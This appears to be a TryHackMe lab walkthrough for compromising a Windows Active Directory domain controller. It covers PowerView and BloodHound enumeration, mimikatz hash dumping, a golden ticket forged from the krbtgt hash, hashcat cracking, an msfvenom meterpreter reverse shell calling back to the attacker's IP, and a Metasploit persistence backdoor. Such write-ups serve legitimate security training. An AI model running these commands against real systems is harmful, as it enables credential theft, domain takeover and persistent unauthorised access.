## Machine Details
Windows server
ip=10.10.53.146
Username: Administrator
Password: P@$$W0rd
Domain Name: CONTROLLER

## PreReqs
```bash
apt install bloodhound neo4j
````
RockYou Wordlist.
Kali has this in ```/usr/share/wordlists```
You will need unzip 
```gunzip /usr/share/wordlists/rockyou.txt.gz```

### Task 1 - Enumeration w/ Powerview

## Connect to Server and start enumeration
```xfreerdp /v:$ip /d:$domain /u:$username```

Start powershell and bypass execution policy

```powershell -ep bypass```

run script in Downloads (powerview.ps1)

```powershell
cd Downloads
. .\PowerView.ps1
```
Blank screen?

Get domain users
```powershell
Get-NetUser | select cn
```
save to a file. Copy and paste to keep locally for ref

Get domain grups
```powershell
Get-NetGroup -GroupName *admin*
```

Use the following cheat sheet to help with questions
>https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

Search for cmdlets to use
```powershell
Get-Command *share*
```

## Q1
Use sharefinder to list server shares
```powershell
Invoke-ShareFinder
```
Save output for reference

## Q2
Find operating systems on the network
```powershell
Get-ADComputer -Filter * -Properties * | Select-Object OperatingSystem
```
Alternative (provided by THM room)
```powershell
Get-NetComputer -fulldata | select operatingsystem
```
## Q3
Hidden Flag in the Users
```powershell
Get-ADUser -Filter *
```
### Enumeration w/ Bloodhound
## ssh to windows server
This is just handy to have for file transfer with scp

Start neo4j/Bloodhound
```bash
neo4j console
```

Look for local host url
login with defaul creds neo4j/neo4j on first login change password

## Getting Loot w/ SharpHound
Start powershell and bypass execution policy

```powershell
powershell -ep bypass
```

run script in Downloads (SharpHoundps1)

```powershell
cd Downloads
. .\SharpHound.ps1
```

collect info
```powershell
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```
Output will be saved to current directory in a zip file

Use SCP to transfer file to computer
```bash
scp Administrator@10.10.53.146:C:/Users/Administrator/Downloads/loot.zip .
```
(notice the slashes)

## Mapping the network /w Bloodhound

Run ```Bloodhound``` and log in with neo4j creds

Import the zip file

In my case the import button didnt work and I had to drag and drop the file into the Bloodhound window

Use bloodhound to answer the Qs

### Dumping hashes w/ mimikatz
## Get those hashes
```powershell
cd Downloads
mimikatz.exe
```
Check you are running as an admin
```pivilege::debug```
Response should be
```Privilege '20' OK```

Dump the hashes
```lsadump::lsa /patch```

Save hashes locally to a file to use later

Find the correct hashcat mode for NTLM
>https://hashcat.net/wiki/doku.php?id=example_hashes

or

```hashcat -h | grep NTLM```

## Q1

Crack the password with rockyou.txt wordlist
```bash
hashcat -m #### <hash> /usr/share/wordlists/rockyou.txt
```

## Q2 

Get the hash from the saved hashes

### Golden Ticket Attacks w/ mimikatz
Go back to the Mimikatz console as previously

Dump the hash and security identifier of the Kerberos Ticket
```lsadump::lsa /inject /name:krbtgt```

Copy the sid (starts with something like S-1-5-21) username, NTLM hash,RID

## create the golden ticket
use the info obtained previous and run the following
```kerberos::golden /user:Administrator /domain:CONTROLLER /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500```

### Enumeration w/ Server Manager

Detailed write up not required.
Questions fairly simple

### Maintaining Access
## Generating a Payload w/ msfvenom

This will require a little more manual setup than the other tasks so it is recommended to have previous knowledge of msfvenom and metasploit.

LHOST refers to Local Host i.e your machine
view your THM ip here - https://tryhackme.com/access

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.202.7 LPORT=5555 -f exe -o shell.exe```

Transfer to target machine  
open Metasploit
```
msfconsole
use exploit/multi/handler
```
this will create a listener on the port that you set it on

Configure the payload to be a windows shell

```set payload windows/meterpreter/reverse_tcp```

set lhost and lport in msfconsole
```
set lhost $localIP
set lport $localport
```
Then start with ```run```

now copy shell.exe to remote computer with scp

```scp shell.exe Administrator@10.10.53.146:c:/```

Run shell.exe on remote computer

you will see a connection and console will be ```meterpreter >```

type ```background``` to send session to background

## Now for persistance

```use exploit/windows/local/persistence``` this module will send a payload every 10 seconds in default

```set session 1```

```run```

If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to ```windows/meterpreter/reverse_tcp``` allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.